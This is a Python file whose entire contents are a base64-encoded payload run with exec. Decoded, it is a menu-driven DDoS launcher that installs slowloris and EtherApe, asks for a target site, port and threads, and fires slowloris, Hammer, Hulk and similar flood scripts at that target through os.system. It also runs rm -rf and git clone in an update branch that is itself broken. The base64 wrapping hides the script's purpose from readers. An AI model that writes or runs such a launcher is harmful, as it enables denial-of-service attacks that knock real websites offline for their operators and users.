import base64
exec(base64.b64decode('I1Rvb2wgQnkgVGVhbSAwMDcgQ29tbXVuaXR5CmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2Vzcwpmcm9tIHN1YnByb2Nlc3MgaW1wb3J0IGNoZWNrX2NhbGwKcHJpbnQoIlwwMzNbMTszMW0gIikKcHJpbnQoIlwwMzNbMG1Mb2FkaW5nLi4uLiIpCnByaW50KCJcMDMzWzE7MzNtSW5zdGFsbGluZyBSZXF1YXJ0bWVudCAoV2FybmluZyBEb24ndCBTa2lwKSIpCnByaW50KCJcMDMzWzE7MzFtU2tpcCBQcmVzcyAoY3RybCtjKSAiKQpwcmludCgiXG4iKQpjbWQwID0gb3Muc3lzdGVtKCJhcHQgdXBkYXRlIC15ICYmIGFwdCB1cGdyYWRlIC15ICYmIHBpcDMgaW5zdGFsbCBzbG93bG9yaXMgJiYgYXB0IGluc3RhbGwgRXRoZXJBcGUiKQpjbWQgID0gb3Muc3lzdGVtKCJzbGVlcCAzICYmIGNsZWFyIikKZGVmIGludHJvKCk6CiAgICBjbWQgID0gb3Muc3lzdGVtKCJjbGVhciIpCiAgICBwcmludCgiIiIKXDAzM1sxOzMxbTo6Ojo6Ojo6OiA6Ojo6Ojo6OjogIDo6Ojo6Ojo6ICA6Ojo6Ojo6OiAgClwwMzNbMTszMW06KzogICAgOis6Ois6ICAgIDorOjorOiAgICA6Kzo6KzogICAgOis6IApcMDMzWzE7MzFtKzorICAgICs6Kys6KyAgICArOisrOisgICAgKzorKzorICAgICAgICAKXDAzM1sxOzM0bSsjKyAgICArOisrIysgICAgKzorKyMrICAgICs6KysjKys6KysjKysgClwwMzNbMTszNG0rIysgICAgKyMrKyMrICAgICsjKysjKyAgICArIysgICAgICAgKyMrIApcMDMzWzE7MzRtIysjICAgICMrIyMrIyAgICAjKyMjKyMgICAgIysjIysjICAgICMrIyAKXDAzM1sxOzM0bSMjIyMjIyMjIyAjIyMjIyMjIyMgICMjIyMjIyMjICAjIyMjIyMjIyAgCgpcMDMzWzE7MzRt4o+j4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4o+j4ouZICIiIikKICAgIHByaW50KCIiIi5fXyAgICAgICwgICAgIC4gICAgICAsICAgICAgLi5fXyAgICAgICAgICAgLiAgIC5fIF9fLiAgICAgICAgICAgICAgICAgCnwgIFwqIF9fLSstLl8uKnxfIC4gLi0rLSBfICBffHwgIFwgXyAuXyAqIF8ufCBfIHwsKF9fICBfIC5fLi4gICwqIF8uIF8gCnxfXy98XykgIHwgWyAgfFtfKShffCB8ICgvLChfXXxfXy8oLyxbICl8KF9dfChfKXwgLl9fKSgvLFsgICBcLyB8KF8uKC8sICAKICAgICAgICAgICAgICAgICAgICAgICBcMDMzWzBtRGRvcy1BdHRhY2sgQWR2YW5jZS1Ub29sICBbVG9vbCBieT09Pk5haGlkIEFsYW1dClwwMzNbMTszM23ij6MtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLeKPowpcMDMzWzE7MzNtfCAgICBcMDMzWzBtRERPUyAgICAgICAgICAgICAgICAgXDAzM1sxOzMzbXwgICAgIFRFU1RJTkcgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXDAzM1sxOzMzbXwKXDAzM1sxOzMzbeKPoy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t4o+jClwwMzNbMTszM218ICBcMDMzWzE7MzFtKDEpIFNsb3dsb3JpcyAgICAgICAgICAgfCAgKDYpIEZpbmQgV2Vic2l0ZSBJcCAoVXNpbmcgcGluZykgICAgICAgICAgIFwwMzNbMTszM218ClwwMzNbMTszM218ICBcMDMzWzE7MzRtKDIpIEhhbW1lciAgICAgICAgICAgICAgfCAgKDcpIENhcHR1cmVpbmcgRGF0YSAoVXNpbmcgRXRoZXJBcGUpICAgICAgIFwwMzNbMTszM218ClwwMzNbMTszM218ICBcMDMzWzE7MzFtKDMpIEh1bGsgICAgICAgICAgICAgICAgfCAgKDgpIFVwZGF0ZSBEZG9za2l0LVRvb2wgICAgICAgICAgICAgICAgICAgIFwwMzNbMTszM218ClwwMzNbMTszM218ICBcMDMzWzE7MzRtKDQpIFBsYW5uZXR3b3JrLURET1MgICAgfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwwMzNbMTszM218ClwwMzNbMTszM218ICBcMDMzWzE7MzFtKDUpIExJVEVERE9TICAgICAgICAgICAgfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwwMzNbMTszM218ClwwMzNbMTszM23ij6MtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLeKPoyIiIikKICAgIHByaW50KCJcMDMzWzE7MzNtfFwwMzNbMG1Ob3RlOiBEb24ndCBGb3JnZXQgdG8gVGhhbmtzISEhIikKICAgIHByaW50KCJcMDMzWzE7MzNtfFsrXSBDaG9pY2UgeW91ciBhdHRhY2sgb3B0aW9uIFsrXSIpCiAgICB2YXIgPSBpbnQoaW5wdXQoIuKUlOKUgD4+IikpCiAgICBpZiB2YXIgPT0gMSA6CiAgICAgICAgcHJpbnQoIlxu4pSMVGFyZ2V0IFNpdGUgKFVSTCkiKQogICAgICAgIHNpdGUgPSBpbnB1dCgi4pSU4pSA4pSAPiIpCiAgICAgICAgcHJpbnQoIlxu4pSMU2V0IFRocmVhZHMiKQogICAgICAgIHRocmFkZSA9IGlucHV0KCLilJTilIDilIA+IikKICAgICAgICBvcmRlciA9ICJzbG93bG9yaXMge30gLXMge30gIi5mb3JtYXQoc2l0ZSx0aHJhZGUpCiAgICAgICAgZ2VueSAgPSBvcy5zeXN0ZW0ob3JkZXIpCiAgICAgICAgaW50cm8oKQogICAgZWxpZiB2YXIgPT0gMiA6CiAgICAgICAgcHJpbnQoIlxu4pSMVGFyZ2V0IFNpdGUgKElQKSIpCiAgICAgICAgc2VydmVyaXAgPSBpbnB1dCgi4pSU4pSA4pSAPiIpCiAgICAgICAgcHJpbnQoIlxu4pSMU2V0IFBvcnQgRXhhbXBsZTogODA4MCIpCiAgICAgICAgcG9ydCA9IGlucHV0KCLilJTilIDilIA+IikKICAgICAgICBwcmludCgiXG7ilIxUdXJibyBMZXZlbCBFeGFtcGxlOiAxMzUiKQogICAgICAgIHR1cmJvID0gaW5wdXQoIuKUlOKUgOKUgD4iKQogICAgICAgIG9yZGVyID0gInB5dGhvbjMgZGRvczEucHkgLXMge30gLXAge30gLXQge30gIi5mb3JtYXQoc2VydmVyaXAscG9ydCx0dXJibykKICAgICAgICBnZW55ICA9IG9zLnN5c3RlbShvcmRlcikKICAgICAgICBpbnRybygpCiAgICBlbGlmIHZhciA9PSAzIDoKICAgICAgICBwcmludCgiXG7ilIxUYXJnZXQgU2l0ZSAoVVJMKSIpCiAgICAgICAgc2l0ZSA9IGlucHV0KCLilJTilIDilIA+IikKICAgICAgICBvcmRlciA9ICJweXRob24yIGRkb3MyLnB5IHt9Ii5mb3JtYXQoc2l0ZSkKICAgICAgICBnZW55ICA9IG9zLnN5c3RlbShvcmRlcikKICAgICAgICBpbnRybygpCiAgICBlbGlmIHZhciA9PSA0IDoKICAgICAgICBwcmludCgiXG7ilIxUYXJnZXQgU2l0ZSAoSVApIikKICAgICAgICBpcCA9IGlucHV0KCLilJTilIDilIA+IikKICAgICAgICBwcmludCgiXG7ilIxTZXQgUG9ydCBFeGFtcGxlOiA4MDgwIikKICAgICAgICBwb3J0ID0gaW5wdXQoIuKUlOKUgOKUgD4iKQogICAgICAgIHByaW50KCJcbuKUjFNldCBUaHJlYWRzIikKICAgICAgICB0aHJlYWQgPSBpbnB1dCgi4pSU4pSA4pSAPiIpCiAgICAgICAgb3JkZXIgPSAicHl0aG9uMiBkZG9zMy5weSB7fSB7fSB7fSIuZm9ybWF0KGlwLHBvcnQsdGhyZWFkKQogICAgICAgIGdlbnkgID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIGludHJvKCkKICAgIGVsaWYgdmFyID09IDUgOgogICAgICAgIHByaW50KCJcbuKUjFRhcmdldCBTaXRlIChJUCkiKQogICAgICAgIGlwID0gaW5wdXQoIuKUlOKUgOKUgD4iKQogICAgICAgIHByaW50KCJcbuKUjFNldCBQb3J0IEV4YW1wbGU6IDgwODAiKQogICAgICAgIHBvcnQgPSBpbnB1dCgi4pSU4pSA4pSAPiIpCiAgICAgICAgcHJpbnQoIlxu4pSMU2V0IFRocmVhZHMgIikKICAgICAgICB0aHJlYWQgPSBpbnB1dCgi4pSU4pSA4pSAPiIpCiAgICAgICAgb3JkZXIgPSAicHl0aG9uMiBkZG9zNC5weSB7fSB7fSB7fSIuZm9ybWF0KGlwLHBvcnQsdGhyZWFkKQogICAgICAgIGdlbnkgID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIGludHJvKCkKICAgIGVsaWYgdmFyID09IDYgOgogICAgICAgIHByaW50KCJcbuKUjFNpdGUgZG9taW4gbmFtZSIpCiAgICAgICAgZG9taW4gPSBpbnB1dCgi4pSU4pSA4pSAPiIpCiAgICAgICAgb3JkZXIgPSAicGluZyB7fSIuZm9ybWF0KGRvbWluKQogICAgICAgIGdlbnkgID0gb3Muc3lzdGVtKG9yZGVyKQogICAgICAgIGludHJvKCkKICAgIGVsaWYgdmFyID09IDcgOgogICAgICAgIHByaW50KCJcbuKUjFR5cGU6IHN1ZG8gZXRoZXJhcGUiKQogICAgICAgIEV0aGVyYXBlID0gaW5wdXQoIuKUlOKUgOKUgD4iKQogICAgICAgIG9yZGVyID0gInt9Ii5mb3JtYXQoRXRoZXJhcGUpCiAgICAgICAgZ2VueSAgPSBvcy5zeXN0ZW0ob3JkZXIpCiAgICAgICAgaW50cm8oKQogICAgZWxpZiB3ID09IDMxIDoKICAgICAgICAgY21kID0gb3Muc3lzdGVtKCJjZCAvcm9vdC8gJiYgcm0gLXJmIGRkb3N0b29sa2l0ICYmIGNkIC9ob21lL2thbGkvICYmIHJtIC1yZiBkZG9zdG9vbGtpdCAmJiBnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL05haGlkQWxhbTE2MDMvZGRvc3Rvb2tpdCAiKQppbnRybygpCg=='))